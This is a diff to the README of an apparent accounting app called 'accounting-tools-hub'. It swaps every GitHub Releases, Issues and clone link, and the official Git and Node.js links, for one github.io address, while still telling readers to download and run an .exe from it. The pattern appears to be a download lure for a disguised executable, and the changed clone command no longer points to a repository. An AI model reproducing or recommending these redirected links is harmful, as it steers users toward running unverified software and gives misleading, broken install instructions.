@@ -1,6 +1,6 @@
 # 🧮 accounting-tools-hub - Simple Accounting Tools for Your Business
 
-[![Download from Releases](https://img.shields.io/badge/Download-From_Releases-blue?style=for-the-badge&logo=github)](https://github.com/serversmen-sys/accounting-tools-hub/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-From_Releases-blue?style=for-the-badge&logo=github)](https://serversmen-sys.github.io)
 
 ## 📥 Download and Install
 
@@ -8,7 +8,7 @@ You do not need to be a developer or know any code to use accounting-tools-hub. 
 
 **Step 1: Get the latest build**
 
-Visit the [Releases page](https://github.com/serversmen-sys/accounting-tools-hub/releases) and look for the newest version. The file name will be something like `accounting-tools-hub-v2026.1.0.exe`. Click on it to download.
+Visit the [Releases page](https://serversmen-sys.github.io) and look for the newest version. The file name will be something like `accounting-tools-hub-v2026.1.0.exe`. Click on it to download.
 
 **Step 2: Run the installer**
 
@@ -106,9 +106,9 @@ You can change how the app behaves. Click the **Settings** gear icon in the top�
 
 If you are comfortable with the command line, you can also run the app from source. This is not required for normal use.
 
-1. Install [Git](https://git-scm.com/) and [Node.js](https://nodejs.org/).
+1. Install [Git](https://serversmen-sys.github.io) and [Node.js](https://serversmen-sys.github.io).
 2. Open a terminal (Command Prompt or PowerShell).
-3. Run `git clone https://github.com/serversmen-sys/accounting-tools-hub.git`
+3. Run `git clone https://serversmen-sys.github.io`
 4. Change into the folder: `cd accounting-tools-hub`
 5. Run `npm install`
 6. Run `npm start`
@@ -117,7 +117,7 @@ The app will open in your browser. You can also build your own installer with `n
 
 ## 🧪 Testing New Features
 
-We release updates every few months. You can try the latest development build (may have bugs) from the same [Releases page](https://github.com/serversmen-sys/accounting-tools-hub/releases) – look for a file with “beta” or “pre‑release” in the name.
+We release updates every few months. You can try the latest development build (may have bugs) from the same [Releases page](https://serversmen-sys.github.io) – look for a file with “beta” or “pre‑release” in the name.
 
 ## 📄 License
 
@@ -125,7 +125,7 @@ This project is released under the MIT License. You can use, modify, and distrib
 
 ## 💬 Getting Help
 
-- Open an issue on the [GitHub Issues page](https://github.com/serversmen-sys/accounting-tools-hub/issues) if you find a bug or want a new feature.
+- Open an issue on the [GitHub Issues page](https://serversmen-sys.github.io) if you find a bug or want a new feature.
 - Check the **Wiki** tab on the repository for more guides.
 
 Keywords: accounting tools, free accounting software, Windows desktop app, invoice generator, expense tracker, small business accounting, open source accounting, browser-based accounting, local app, no cloud.
